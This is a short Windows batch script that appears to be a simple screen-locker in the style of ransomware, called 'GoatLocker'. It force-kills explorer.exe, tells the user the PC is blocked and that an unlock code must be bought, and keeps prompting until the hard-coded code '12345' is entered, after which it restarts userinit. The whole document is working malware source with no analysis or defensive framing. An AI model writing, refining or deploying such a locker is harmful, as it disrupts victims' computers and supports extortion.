@echo off
taskkill /f /im explorer.exe
cls
echo Your PC is blocked by GoatLocker
echo To unlock it you need to buy a unlock code
set code=""

:code
set /p code="Enter Code:"
if "%code%"=="12345" goto correct
if NOT "%code%"=="12345" goto wrong

:correct
start userinit
echo Correct Code
pause
exit

:wrong
echo Wrong Code, Try again
goto code